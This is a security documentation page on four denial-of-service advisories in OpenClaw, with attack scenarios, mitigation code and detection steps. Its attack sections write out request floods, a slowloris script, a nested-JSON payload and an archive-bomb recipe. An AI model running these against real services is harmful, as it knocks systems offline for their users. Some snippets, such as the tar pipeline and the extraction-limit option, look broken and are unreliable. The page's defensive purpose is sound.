# Denial of Service (DoS)

## Overview

Denial of Service vulnerabilities allow attackers to exhaust server resources, making services unavailable to legitimate users. In OpenClaw, DoS vulnerabilities have been discovered in webhook handling, memory exhaustion, and archive extraction that can lead to service disruption.

**Impact**: Service unavailability, resource exhaustion, and production system outages.

## Vulnerability List

### Medium Severity

| Advisory | CVE | Summary | Fixed In |
|----------|-----|---------|----------|
| [GHSA-6rmx-gvvg-vh6j](https://github.com/openclaw/openclaw/security/advisories/GHSA-6rmx-gvvg-vh6j) | — | hooks count non-POST requests toward auth lockout | v2026.3.7 |
| [GHSA-wr6m-jg37-68xh](https://github.com/openclaw/openclaw/security/advisories/GHSA-wr6m-jg37-68xh) | — | Unbounded memory growth in Zalo webhook via query-string key churn (unauthenticated DoS) | v2026.3.1 |
| [GHSA-x4vp-4235-65hg](https://github.com/openclaw/openclaw/security/advisories/GHSA-x4vp-4235-65hg) | — | Pre-auth webhook body parsing can enable unauthenticated slow-request DoS | v2026.3.2 |
| [GHSA-77hf-7fqf-f227](https://github.com/openclaw/openclaw/security/advisories/GHSA-77hf-7fqf-f227) | — | skills-install-download: tar.bz2 extraction bypassed archive safety parity checks (local DoS) | v2026.3.2 |

**Total**: 4 advisories (all medium severity)

## Attack Scenarios

### 1. Auth Lockout Counting Non-POST Requests (GHSA-6rmx-gvvg-vh6j)

**Attack Vector**: Trigger authentication lockout by sending non-POST requests to webhook endpoints, exhausting rate-limit resources and blocking legitimate webhook processing.

**Example**:
```bash
# Attacker floods webhook with GET requests
for i in {1..1000}; do
  curl -X GET http://openclaw:8080/webhook/telegram \
    -H "User-Agent: Mozilla/5.0"
done

# Each non-POST request counts toward auth lockout
# Legitimate POST webhooks get blocked due to rate limit exhaustion
# Attacker achieves DoS without sending proper webhook payloads
```

**Impact**:
- Webhook processing blocked
- External service integration disrupted
- Auth system resource exhaustion
- Legitimate API calls rejected

**Vulnerable Pattern**:
```javascript
// Vulnerable code (simplified)
function handleWebhook(req, res) {
  // Counts ALL requests, not just POST
  authLockout.recordAttempt(req.ip);

  // After threshold, blocks all requests
  if (authLockout.isLocked(req.ip)) {
    return res.status(429).send('Too Many Requests');
  }

  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  // Process webhook...
}
```

### 2. Unbounded Memory Growth via Zalo Webhook (GHSA-wr6m-jg37-68xh)

**Attack Vector**: Exploit Zalo webhook query-string parsing to cause unbounded memory growth through key churn, leading to out-of-memory (OOM) crashes.

**Example**:
```bash
# Attacker sends webhook with thousands of unique query string keys
curl "http://openclaw:8080/webhook/zalo?key1=val&key2=val&key3=val...&key10000=val" \
  -X POST -d '{"data":"webhook"}'

# Memory allocated for each unique key
# No cleanup or limit on key count
# OpenClaw process memory grows until OOM

# After multiple requests:
# Memory: 100MB → 500MB → 1GB → OOM → Crash
```

**Attack Flow**:
1. Attacker sends webhook with unique query string keys each time
2. Parser allocates memory for each key in the query string object
3. No TTL or cleanup on old keys
4. Memory accumulates across multiple webhook requests
5. Process exceeds available memory and crashes

**Impact**:
- Out-of-memory crash
- Service shutdown
- Webhook processing halted
- Potential cascade failure in microservice environments

**Technical Details**:
```javascript
// Vulnerable parsing (simplified)
const url = 'http://openclaw:8080/webhook/zalo?key1=val&key2=val...';
const parsed = new URL(url);
const params = Object.fromEntries(parsed.searchParams);
// Object grows unbounded, no cleanup
webhookCache[cacheKey] = params; // Memory leak
```

### 3. Pre-Auth Webhook Body Parsing DoS (GHSA-x4vp-4235-65hg)

**Attack Vector**: Send crafted webhook payloads with expensive parsing operations (large JSON, deeply nested objects) before authentication, causing slow-request DoS on pre-auth endpoints.

**Example**:
```bash
# Attacker sends deeply nested JSON that takes seconds to parse
PAYLOAD=$(python3 -c "
import json
obj = {}
curr = obj
for i in range(1000):
    curr['nested'] = {}
    curr = curr['nested']
curr['data'] = 'x' * 1000000  # 1MB string at end
print(json.dumps(obj))
")

curl http://openclaw:8080/webhook/generic \
  -X POST \
  -H "Content-Type: application/json" \
  -d "$PAYLOAD"

# Parser takes 10+ seconds per request
# Multiple parallel requests consume all thread/process resources
# Legitimate requests timeout
```

**Attack Pattern**:
```javascript
// Vulnerable pre-auth parsing
app.post('/webhook/generic', (req, res) => {
  // No rate limiting before parsing
  // No timeout on JSON parsing
  const data = req.body; // Blocks while parsing expensive payload

  // Authentication happens AFTER expensive parsing
  if (!validateSecret(req.headers['x-signature'])) {
    return res.status(401).send('Unauthorized');
  }

  processWebhook(data);
});
```

**Resource Exhaustion**:
- Large payload size: 10MB+ JSON payloads consume memory
- Deep nesting: 1000+ levels require exponential processing time
- String operations: Millions of character parsing and validation
- Regex: Catastrophic backtracking on unvalidated regex patterns

**Impact**:
- Thread/process pool exhaustion
- Legitimate requests timeout
- Server becomes unresponsive
- Cascading failure if behind load balancer

### 4. tar.bz2 Extraction Bypass DoS (GHSA-77hf-7fqf-f227)

**Attack Vector**: Craft tar.bz2 archives that bypass safety parity checks, allowing archive bombs (compressed files expanding to massive sizes) to cause local DoS.

**Example**:
```bash
# Create archive bomb (compression bomb)
# 1.2MB compressed → 100GB+ uncompressed
dd if=/dev/zero bs=1M count=100000 | tar - | bzip2 > bomb.tar.bz2

# Upload to OpenClaw skill installation
openclaw skill install bomb.tar.bz2

# Archive extracts without size limit checks
# /tmp/extract/ fills disk space
# OpenClaw process crashes due to full filesystem
# Other services on same system also affected
```

**Vulnerable Pattern**:
```javascript
// Vulnerable extraction without safety checks
async function extractArchive(filePath) {
  // No size validation before extraction
  // No check for symlinks, hard links, or path traversal
  // Safety parity checks bypassed in tar.bz2 handler

  const extract = tar.extract({
    cwd: extractDir,
    // Missing options:
    // preservePaths: false
    // maxExtractSize: 1000000000 (1GB limit)
  });

  fs.createReadStream(filePath).pipe(extract);

  // Waits for extraction to complete
  // Meanwhile disk fills up
}
```

**Archive Bomb Techniques**:
1. **Compression Bomb**: Single massive file compressed 1000:1
2. **Nested Bombs**: Bombs inside bombs (zips inside tars)
3. **Sparse Files**: Files with large holes to inflate actual size when extracted
4. **Symlink Chains**: Symlinks pointing to each other creating loops

**Impact**:
- Disk space exhaustion
- Service crash
- Filesystem corruption
- Cascading failure across services sharing filesystem
- Potential recovery complexity

## Common DoS Attack Techniques

### HTTP Flood
```bash
# Send high volume of HTTP requests
ab -n 100000 -c 1000 http://openclaw:8080/webhook
```

### Slowloris (Slow Request)
```bash
# Send requests slowly to exhaust connection pools
python3 -c "
import socket
for i in range(500):
    s = socket.socket()
    s.connect(('openclaw', 8080))
    s.send(b'GET / HTTP/1.1\r\nHost: localhost\r\n')
    # Never complete the request
"
```

### Resource Exhaustion
- **Memory**: Large payloads, memory leaks
- **CPU**: Expensive operations, regex matching
- **Disk**: Archive bombs, large files
- **Connections**: Slowloris, incomplete requests

## Mitigation

### 1. Rate Limiting and Throttling

**HTTP Request Rate Limiting**:
```javascript
const rateLimit = require('express-rate-limit');

// Rate limit webhook endpoints
const webhookLimiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 100, // Max 100 requests per minute
  standardHeaders: true,
  legacyHeaders: false,
  // Only count POST requests
  skip: (req) => req.method !== 'POST'
});

app.post('/webhook/:provider', webhookLimiter, handleWebhook);
```

**Per-IP Rate Limiting**:
```javascript
const ipLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 1000,
  keyGenerator: (req) => req.ip,
  store: new RedisStore({
    client: redis,
    prefix: 'rl:'
  })
});
```

### 2. Request Size and Timeout Limits

**Body Size Limits**:
```javascript
// Limit request payload size
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ limit: '1mb' }));

// Custom endpoint limit for files
app.post('/upload', express.json({ limit: '100mb' }), handleUpload);
```

**Request Timeout**:
```javascript
// Set global timeout
app.use((req, res, next) => {
  req.setTimeout(30000); // 30 second timeout
  res.setTimeout(30000);
  next();
});

// Per-endpoint timeout
const timeout = require('connect-timeout');
app.post('/webhook', timeout('5s'), handleWebhook);
```

### 3. Archive Extraction Safety

**Validate Archive Before Extraction**:
```javascript
async function safeExtractArchive(filePath, maxSize = 1e9) {
  const tar = require('tar');
  const fs = require('fs');

  // 1. Check compressed file size
  const stats = fs.statSync(filePath);
  if (stats.size > maxSize) {
    throw new Error('Archive too large');
  }

  // 2. Set extraction limits
  const extract = tar.extract({
    cwd: extractDir,
    strict: true,
    preservePaths: false,
    maxExtractSize: maxSize,

    // Validate each file before extraction
    onentry: (entry) => {
      if (entry.size > maxSize) {
        throw new Error('File too large');
      }
      if (entry.type === 'SymbolicLink' || entry.type === 'Link') {
        throw new Error('Symlinks not allowed');
      }
      // Check for path traversal
      if (entry.name.includes('..')) {
        throw new Error('Path traversal detected');
      }
    }
  });

  return new Promise((resolve, reject) => {
    fs.createReadStream(filePath)
      .pipe(extract)
      .on('end', resolve)
      .on('error', reject);
  });
}
```

### 4. Memory and Resource Limits

**Node.js Process Limits**:
```bash
# Set maximum heap size
node --max-old-space-size=2048 app.js

# Set ulimits for resource constraints
ulimit -m 2097152  # 2GB memory
ulimit -n 4096     # 4096 file descriptors
ulimit -u 256      # 256 processes
```

**Container Resource Limits**:
```yaml
# Docker Compose
services:
  openclaw:
    image: openclaw:latest
    deploy:
      resources:
        limits:
          cpus: '2'
          memory: 2G
        reservations:
          cpus: '1'
          memory: 1G
```

### 5. Query String Parameter Limits

**Limit Query String Parameters**:
```javascript
const qs = require('qs');

// Limit number of parameters and depth
app.use(express.urlencoded({
  parameterLimit: 50,  // Max 50 parameters
  limit: '10kb'        // Max 10KB query string
}));

// Custom parser with limits
app.use((req, res, next) => {
  const params = new URL('http://localhost' + req.url).searchParams;
  if (params.size > 50) {
    return res.status(413).send('Too many parameters');
  }
  next();
});
```

### 6. Disk Space Monitoring

**Monitor Filesystem**:
```bash
# Alert if disk usage > 80%
df -h | awk '$5 > 80 {print "ALERT: Disk " $6 " is " $5 " full"}'

# Monitor extract directory
du -sh /tmp/extract/ | awk '{if ($1+0 > 10) print "ALERT: Extract dir too large"}'
```

### 7. Circuit Breaker Pattern

**Stop Processing After Resource Exhaustion**:
```javascript
class CircuitBreaker {
  constructor(threshold = 0.8) {
    this.threshold = threshold;
    this.isOpen = false;
  }

  async checkHealth() {
    const usage = process.memoryUsage();
    const heapUsedPercent = usage.heapUsed / usage.heapTotal;

    if (heapUsedPercent > this.threshold) {
      this.isOpen = true;
      // Stop accepting new requests
      return false;
    }

    return true;
  }

  async execute(fn) {
    if (!await this.checkHealth()) {
      throw new Error('Service overloaded');
    }
    return fn();
  }
}
```

### 8. OpenClaw Runtime Checks

Enable DoS protection runtime checks:

```bash
# Enable webhook rate limiting
openclaw config set webhook.rateLimit 100/minute

# Enable payload size limits
openclaw config set webhook.maxPayloadSize 1mb

# Enable extraction safety
openclaw config set archive.maxExtractSize 1gb
openclaw config set archive.allowSymlinks false

# Enable memory limits
openclaw config set process.maxHeapSize 2gb
```

See [Hardening Guide](../best-practices/hardening-guide.md) for comprehensive DoS protection configuration.

## Detection

### Request Monitoring

```bash
# Monitor for DoS patterns
tail -f /var/log/openclaw/webhook.log | \
  awk '{print $1}' | sort | uniq -c | sort -rn | head

# Check for non-POST requests to webhooks
grep -c "GET /webhook" /var/log/openclaw/access.log

# Monitor for slow requests
grep "duration.*[0-9]\{4,\}ms" /var/log/openclaw/webhook.log
```

### Anomaly Detection

- Sudden spike in request volume
- Requests with unusually large payloads
- Requests with excessive query parameters
- Memory usage growth without corresponding activity
- Archive extraction taking >30 seconds
- Repeated requests from single IP

### Metrics to Monitor

```javascript
// Track webhook metrics
metrics.recordWebhookRequest({
  provider: req.params.provider,
  method: req.method,
  payloadSize: JSON.stringify(req.body).length,
  processingTime: Date.now() - startTime
});

// Alert on anomalies
if (payloadSize > 5 * 1024 * 1024) {
  logger.warn('Unusually large webhook payload', { payloadSize });
}

if (processingTime > 30000) {
  logger.warn('Slow webhook processing', { processingTime });
}
```

## Related Resources

- **Vulnerability Documentation**:
  - [RCE Vulnerabilities](./rce.md) - RCE can lead to DoS
  - [Command Injection](./command-injection.md) - Command-based resource exhaustion
- **Testing**: DoS test cases available in `tests/` directory
- **Best Practices**:
  - [Hardening Guide - Resource Limits](../best-practices/hardening-guide.md)
  - [Channel Security - Rate Limiting](./channel-security.md)
- **Test Guide**: [Webhook Resilience Testing Guide](../test-cases/channel-security-guide.md)

## References

- **CWE-400**: Uncontrolled Resource Consumption ('Resource Exhaustion')
- **CWE-779**: Logging of Excessive Data
- **CWE-613**: Insufficient Session Expiration
- **OWASP**: [Denial of Service](https://owasp.org/www-community/attacks/Denial_of_Service)
- **NIST**: [Handling Denial of Service Attacks](https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final)
- **MITRE ATT&CK**: T1499 (Endpoint Denial of Service)
